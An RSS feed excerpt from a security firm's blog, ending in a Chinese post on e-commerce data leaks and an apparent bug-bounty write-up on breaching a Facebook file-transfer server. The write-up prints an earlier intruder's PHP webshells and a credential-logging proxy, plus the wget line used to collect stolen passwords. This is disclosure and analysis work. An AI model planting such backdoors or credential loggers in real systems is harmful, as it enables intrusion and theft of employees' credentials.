&lt;a href=&quot;http://165.gov.tw/loss_rank.aspx&quot;&gt;http://165.gov.tw/loss_rank.aspx&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;對於無心於資安的業者來說，被揭露這樣的資訊會有一定程度的力量迫使他們把資安做好。但對於已經顧全資安的業者來說，則是摸不著頭緒到底個資從哪邊外洩的。今天我們就來談談，到底電商網站的資安問題是什麼，民眾的個資又是怎麼外洩的。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;電商網站的困境&quot;&gt;電商網站的困境&lt;/h3&gt;

&lt;p&gt;目前電商網站常見的困境有幾點：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;自行開發網站存在漏洞&lt;/li&gt;
  &lt;li&gt;委外開發網站存在漏洞，但承包商不處理&lt;/li&gt;
  &lt;li&gt;內部員工電腦遭入侵外洩個資&lt;/li&gt;
  &lt;li&gt;配合廠商個資外洩，如金流商、物流商&lt;/li&gt;
  &lt;li&gt;攻擊者用已外洩帳號密碼登入電商網站&lt;/li&gt;
  &lt;li&gt;買家在詐騙集團的賣場交易&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;黑色產業的發展比大家想像中都還要盛行，若企業對攻擊者來說有利可圖，駭客組織會不擇手段入侵取得資料。因此對網站本身、網站周遭系統、企業內部員工、或者以社交工程手法，只要能取得資料都會是他們下手的目標。&lt;/p&gt;

&lt;h4 id=&quot;自行開發網站存在漏洞&quot;&gt;自行開發網站存在漏洞&lt;/h4&gt;

&lt;p&gt;這是目前企業最需要先解決的問題。若網站本身資安體質不好，則會輕易被攻擊者入侵。資安問題往往都是企業內部最難解的問題，道高一尺魔高一丈，若沒有經過完整的&lt;a href=&quot;https://devco.re/services/penetration-test&quot;&gt;滲透測試&lt;/a&gt;，則難以找出問題的根源。找到了問題之後，開發人員的教育訓練、資安機制、資安設備，都會是企業接下來要面對的課題。&lt;/p&gt;

&lt;p&gt;解決方案：滲透測試、資安顧問、教育訓練&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/the_security_dilemma_of_e-commerce_1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;委外開發網站存在漏洞但承包商不處理&quot;&gt;委外開發網站存在漏洞，但承包商不處理&lt;/h4&gt;

&lt;p&gt;不少企業沒有自己開發網站，而是發包給外部廠商開發、維運。承包商的品質通常難以掌控，價格戰的業界生態，更讓開發的品質難以提升。但業者最頭大的是：承包商拒絕處理漏洞。若沒有在一開始的委外合約就明訂資安維護標準，在日後發生資安事件時則難以要求承包商修補漏洞。因此建議業者在日後的委外開發案，明訂資安標準、驗收時檢附第三方滲透測試報告，並且將日後資安維護合約獨立於一般維護約之外，強制執行。&lt;/p&gt;

&lt;p&gt;解決方案：選商標準、開標規格、驗收標準、資安維護合約&lt;/p&gt;

&lt;h4 id=&quot;內部員工電腦遭入侵外洩個資&quot;&gt;內部員工電腦遭入侵外洩個資&lt;/h4&gt;

&lt;p&gt;除了伺服器之外，客戶端也是攻擊者下手的目標。當網站難以被入侵，攻擊者就會轉往員工電腦下手。透過社交工程、搭配惡意郵件等 APT 攻擊，入侵個人電腦後取得消費者個資，甚至做為跳板滲透企業內部擴大攻擊成果。若沒有足夠的資安意識，員工將會是企業最大的資安缺口。&lt;/p&gt;

&lt;p&gt;解決方案：強化資安思維、權限最小化、APT 防禦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/the_security_dilemma_of_e-commerce_2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;配合廠商個資外洩如金流商物流商&quot;&gt;配合廠商個資外洩，如金流商、物流商&lt;/h4&gt;

&lt;p&gt;當企業裡裡外外都防禦好了，個資還在外洩，到底發生什麼事情了呢？別忘了一個電商網站有各種與外界橋接的服務，例如交易的金流、運輸的物流。若搭配的外部系統遭到入侵，個資一樣會被取得。但民眾、媒體只會覺得「我在這家電商平台買東西被詐騙」，而怪罪到企業本身。企業有責任要求配合的廠商一同將資安、個資把關好。&lt;/p&gt;

&lt;p&gt;解決方案：配合廠商的資安規範、滲透測試&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/the_security_dilemma_of_e-commerce_3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;攻擊者用已外洩帳號密碼登入電商網站&quot;&gt;攻擊者用已外洩帳號密碼登入電商網站&lt;/h4&gt;

&lt;p&gt;資安的責任並不僅在企業，有的時候消費者本身帳號的安全也會影響到電商網站的清譽。目前民眾只要接收到詐騙電話，直覺都會是在某個店家的交易被駭，被取得資料後販售給詐騙集團，因而回報給 165 等反詐騙專線。這種案例也會算在電商網站的帳上，但卻不一定是電商網站的問題。這樣的攻擊手法也俗稱「撞庫」。&lt;/p&gt;

&lt;p&gt;解決方案：企業間的聯防、提供使用者帳號保護&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/the_security_dilemma_of_e-commerce_4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;買家在詐騙集團的賣場交易&quot;&gt;買家在詐騙集團的賣場交易&lt;/h4&gt;

&lt;p&gt;只要有利可圖，詐騙集團就會無所不用其極的想獲取利益。當系統已經達成基本的安全、使用者外洩的帳號也已經無法利用之後，詐騙集團將再攻擊人性的漏洞，開設販賣熱門商品的賣場，吸引無辜的受害者購買。或者在賣場的留言區塊假冒賣家，留下自己的 LINE 與消費者溝通，進行詐騙。&lt;/p&gt;

&lt;p&gt;解決方案：消費者安全宣導&lt;/p&gt;

&lt;h3 id=&quot;電商業者該如何自保&quot;&gt;電商業者該如何自保？&lt;/h3&gt;

&lt;p&gt;只要有利益的地方，就會有資安危機。雖說道高一尺魔高一丈，但業者並非只能等著被宰。經營網站最重要的就是保護顧客的資料，明白風險的所在。盤點手上的個資位置、機制、措施，謹慎安排資安規劃，確保將安全的風險降到最低。更進一步也可以建立與資安人員良好的關係，公開漏洞通報管道及獎勵機制，鼓勵資安人員優先通報漏洞給企業，避免流入黑色產業。當然，身為消費者的我們，也應該給予負責的企業掌聲。&lt;/p&gt;

&lt;p&gt;在未來我們的文章將提到企業應該採取的具體作為，敬請期待！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2016/07/29/the_security_dilemma_of_e-commerce/</link>
                <guid>https://devco.re/blog/2016/07/29/the_security_dilemma_of_e-commerce</guid>
                <pubDate>Fri, 29 Jul 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>How I Hacked Facebook, and Found Someone's Backdoor Script</title>
                <description>&lt;p&gt;by &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someone’s Backdoor Script&lt;/a&gt; (English Version)  &lt;br /&gt;
&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/&quot;&gt;滲透 Facebook 的思路與發現&lt;/a&gt; (中文版本)&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;foreword&quot;&gt;Foreword&lt;/h3&gt;

&lt;p&gt;As a pentester, I love server-side vulnerabilities more than client-side ones. Why? Because it’s way much cooler to take over the server directly and gain system SHELL privileges. &amp;lt;(￣︶￣)&amp;gt;&lt;/p&gt;

&lt;p&gt;Of course, both vulnerabilities from the server-side and the client-side are indispensable in a perfect penetration test. Sometimes, in order to take over the server more elegantly, it also need some client-side vulnerabilities to do the trick. But speaking of finding vulnerabilities, I prefer to find server-side vulnerabilities first.&lt;/p&gt;

&lt;p&gt;With the growing popularity of Facebook around the world, I’ve always been interested in testing the security of Facebook. Luckily, in 2012, Facebook launched the &lt;a href=&quot;https://www.facebook.com/whitehat/&quot;&gt;Bug Bounty Program&lt;/a&gt;, which even motivated me to give it a shot.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;From a pentester’s view, I tend to start from recon and do some research. First, I’ll determine how large is the “territory” of the company on the internet, then…try to find a nice entrance to get in, for example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;What can I find by Google Hacking?&lt;/li&gt;
  &lt;li&gt;How many B Class IP addresses are used? How many C Class IPs?&lt;/li&gt;
  &lt;li&gt;Whois? Reverse Whois?&lt;/li&gt;
  &lt;li&gt;What domain names are used? What are their internal domain names? Then proceed with enumerating sub-domains&lt;/li&gt;
  &lt;li&gt;What are their preferred techniques and equipment vendors?&lt;/li&gt;
  &lt;li&gt;Any data breach on Github or Pastebin?&lt;/li&gt;
  &lt;li&gt;…etc&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Of course, Bug Bounty is nothing about firing random attacks without restrictions. By comparing your findings with the permitted actions set forth by Bug Bounty, the overlapping part will be the part worth trying.&lt;/p&gt;

&lt;p&gt;Here I’d like to explain some common security problems found in large corporations during pentesting by giving an example.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;For most enterprises, “&lt;strong&gt;Network Boundary&lt;/strong&gt;” is a rather difficult part to take care of. When the scale of a company has grown large, there are tens of thousands of routers, servers, computers for the MIS to handle, it’s impossible to build up a perfect mechanism of protection. Security attacks can only be defended with general rules, but a successful attack only needs a tiny weak spot. That’s why luck is often on the attacker’s side: a vulnerable server on the “border” is enough to grant a ticket to the internal network!&lt;/li&gt;
  &lt;li&gt;Lack of awareness in “&lt;strong&gt;Networking Equipment&lt;/strong&gt;” protection. Most networking equipment doesn’t offer delicate SHELL controls and can only be configured on the user interface. Oftentimes the protection of these devices is built on the Network Layer. However, users might not even notice if these devices were compromised by 0-Day or 1-Day attacks.&lt;/li&gt;
  &lt;li&gt;Security of people: now we have witnessed the emergence of the “&lt;strong&gt;Breached Database&lt;/strong&gt;” (aka “&lt;strong&gt;Social Engineering Database&lt;/strong&gt;” in China), these leaked data sometimes makes the penetration difficulty incredibly low. Just connect to the breach database, find a user credential with VPN access…then voilà! You can proceed with penetrating the internal network. This is especially true when the scope of the data breach is so huge that the Key Man’s password can be found in the breached data. If this happens, then the security of the victim company will become nothing. :P  &lt;br /&gt;
&lt;br /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;For sure, when looking for the vulnerabilities on Facebook, I followed the thinking of the penetration tests which I was used to. When I was doing some recon and research, not only did I look up the domain names of Facebook itself, but also tried Reverse Whois. And to my surprise, I found an INTERESTING domain name:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tfbnw.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;TFBNW seemed to stand for “&lt;strong&gt;TheFacebook Network&lt;/strong&gt;”  &lt;br /&gt;
Then I found bellow server through public data&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vpn.tfbnw.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;WOW. When I accessed vpn.tfbnw.net there’s the Juniper SSL VPN login interface. But its version seemed to be quite new and there was no vulnerability can be directly exploited…nevertheless, it brought up the beginning of the following story.&lt;/p&gt;

&lt;p&gt;It looked like TFBNW was an internal domain name for Facebook. Let’s try to enumerate the C Class IPs of vpn.tfbnw.net and found some interesting servers, for example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Mail Server Outlook Web App&lt;/li&gt;
  &lt;li&gt;F5 BIGIP SSL VPN&lt;/li&gt;
  &lt;li&gt;CISCO ASA SSL VPN&lt;/li&gt;
  &lt;li&gt;Oracle E-Business&lt;/li&gt;
  &lt;li&gt;MobileIron MDM&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;From the info of these servers, I thought that these C Class IPs were relatively important for Facebook. Now, the whole story officially starts here.&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;vulnerability-discovery&quot;&gt;Vulnerability Discovery&lt;/h3&gt;

&lt;p&gt;I found a special server among these C Class IPs.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;files.fb.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/1.jpg&quot; alt=&quot;files.fb.com&quot; /&gt;&lt;br /&gt;
&lt;em&gt;↑ Login Interface of files.fb.com&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
Judging from the LOGO and Footer, this seems to be Accellion’s Secure File Transfer (hereafter known as FTA)&lt;/p&gt;

&lt;p&gt;FTA is a product which enables secure file transfer, online file sharing and syncing, as well as integration with Single Sign-on mechanisms including AD, LDAP and Kerberos. The Enterprise version even supports SSL VPN service.&lt;/p&gt;

&lt;p&gt;Upon seeing this, the first thing I did was searching for publicized exploits on the internet. The latest one was found by HD Moore and made public on this Rapid7’s Advisory&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Whether this vulnerability is exploitable can be determined by the version information leaked from “&lt;strong&gt;/tws/getStatus&lt;/strong&gt;”. At the time I discovered files.fb.com the defective v0.18 has already been updated to v0.20. But from the fragments of source code mentioned in the Advisory, I felt that with such coding style there should still be security issues remained in FTA if I kept looking. Therefore, I began to look for 0-Day vulnerabilities on FTA products!&lt;/p&gt;

&lt;p&gt;Actually, from black-box testing, I didn’t find any possible vulnerabilities, and I had to try white-box testing. After gathering the source codes of previous versions FTA from several resources I could finally proceed with my research!&lt;/p&gt;

&lt;p&gt;The FTA Product&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Web-based user interfaces were mainly composed of Perl &amp;amp; PHP&lt;/li&gt;
  &lt;li&gt;The PHP source codes were encrypted by IonCube&lt;/li&gt;
  &lt;li&gt;Lots of Perl Daemons in the background&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;First I tried to decrypt IonCube encryption. In order to avoid being reviewed by the hackers, a lot of network equipment vendors will encrypt their product source codes. Fortunately, the IonCube version used by FTA was not up to date and could be decrypted with ready-made tools. But I still  had to fix some details, or it’s gonna be messy…&lt;/p&gt;

&lt;p&gt;After a simple review, I thought Rapid7 should have already got the easier vulnerabilities. T^T  &lt;br /&gt;
And the vulnerabilities which needed to be triggered were not easy to exploit. Therefore I need to look deeper!&lt;/p&gt;

&lt;p&gt;Finally, I found 7 vulnerabilities, including&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Apart from reporting to Facebook Security Team, other vulnerabilities were submitted to Accellion Support Team in Advisory for their reference. After vendor patched, I also sent these to CERT/CC and they assigned 4 CVEs for these vulnerabilities.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2016-2350&lt;/li&gt;
  &lt;li&gt;CVE-2016-2351&lt;/li&gt;
  &lt;li&gt;CVE-2016-2352&lt;/li&gt;
  &lt;li&gt;CVE-2016-2353&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;More details will be published after full disclosure policy!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/2.jpg&quot; alt=&quot;shell on facebook&quot; /&gt;&lt;br /&gt;
&lt;em&gt;↑ Using Pre-Auth SQL Injection to Write Webshell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
After taking control of the server successfully, the first thing is to check whether the server environment is friendly to you. To stay on the server longer, you have to be familiar with the environments, restrictions, logs, etc and try hard not to be detected. :P&lt;/p&gt;

&lt;p&gt;There are some restrictions on the server:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Firewall outbound connection unavailable, including TCP, UDP, port 53, 80 and 443&lt;/li&gt;
  &lt;li&gt;Remote Syslog server&lt;/li&gt;
  &lt;li&gt;Auditd logs enabled&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Although the outbound connection was not available, but it looked like ICMP Tunnel was working. Nevertheless, this was only a Bug Bounty Program, we could simply control the server with a webshell.&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;was-there-something-strange&quot;&gt;Was There Something Strange?&lt;/h3&gt;

&lt;p&gt;While collecting vulnerability details and evidences for reporting to Facebook, I found some strange things on web log.&lt;/p&gt;

&lt;p&gt;First of all I found some strange PHP error messages in “&lt;strong&gt;/var/opt/apache/php_error_log&lt;/strong&gt;”  &lt;br /&gt;
These error messages seemed to be caused by modifying codes online?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/3.jpg&quot; alt=&quot;PHP error log&quot; /&gt;&lt;br /&gt;
&lt;em&gt;↑ PHP error log&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
I followed the PHP paths in error messages and ended up with discovering suspicious WEBSHELL files left by previous “visitors”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/4.jpg&quot; alt=&quot;Webshell on facebook server&quot; /&gt;&lt;br /&gt;
&lt;em&gt;↑ Webshell on facebook server&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;some contents of the files are as follows:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;sshpass&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Right, THAT &lt;a href=&quot;http://linux.die.net/man/1/sshpass&quot;&gt;sshpass&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;div class=&quot;highlight-name&quot;&gt;bN3d10Aw.php&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;highlight-name&quot;&gt;uploader.php&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;f][&amp;quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp_name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;], basename(&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$_FILES[&amp;quot;f&amp;quot;]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[&amp;quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;])); ?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;highlight-name&quot;&gt;d.php&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;include_oncce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/home/seos/courier/remote.inc&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;c&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;highlight-name&quot;&gt;sclient\_user\_class\_standard.inc&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;sclient_user_class_standard.inc.orig&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/home/seos/courier/B3dKe9sQaa0L.log&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
&lt;span class=&quot;nv&quot;&gt;$retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$max_retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;// blah blah blah...&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Y-m-d H:i:s T&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;REMOTE_ADDR&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;HTTP_USER_AGENT&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;POST=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;GET=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;COOKIE=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;// blah blah blah...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The first few ones were typical PHP one-line backdoor and there’s one exception: “&lt;strong&gt;sclient_user_class_standard.inc&lt;/strong&gt;”&lt;/p&gt;

&lt;p&gt;In include_once “&lt;strong&gt;sclient_user_class_standard.inc.orig&lt;/strong&gt;” was the original PHP app for password verification, and the hacker created a proxy in between to log GET, POST, COOKIE values while some important operations were under way.&lt;/p&gt;

&lt;p&gt;A brief summary, the hacker created a proxy on the credential page to log the credentials of Facebook employees. These logged passwords were stored under web directory for the hacker to use WGET every once in a while&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://files.fb.com/courier/B3dKe9sQaa0L.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/5.jpg&quot; alt=&quot;logged password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
&lt;em&gt;↑ Logged passwords&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;From this info we can see that apart from the logged credentials there were also contents of letters requesting files from FTA, and these logged credentials were rotated regularly (this will be mentioned later, that’s kinda cheap…XD)&lt;/p&gt;

&lt;p&gt;And at the time I discovered these, there were around 300 logged credentials dated between February 1st to 7th, from February 1st, mostly “&lt;strong&gt;@fb.com&lt;/strong&gt;” and “&lt;strong&gt;@facebook.com&lt;/strong&gt;”. Upon seeing it I thought it’s a pretty serious security incident. In FTA, there were mainly two modes for user login&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Regular users sign up: their password hash were stored in the database and hashed encrypted with SHA256+SALT&lt;/li&gt;
  &lt;li&gt;All Facebook employees (@fb.com) used LDAP and authenticated by AD Server&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I believe these logged credentials were real passwords and I &lt;strong&gt;GUESS&lt;/strong&gt; they can access to services such as Mail OWA, VPN for advanced penetration…&lt;/p&gt;

&lt;p&gt;In addition, this hacker might be careless:P&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;The backdoor parameters were passed through GET method and his footprinting can be identified easily in from web log&lt;/li&gt;
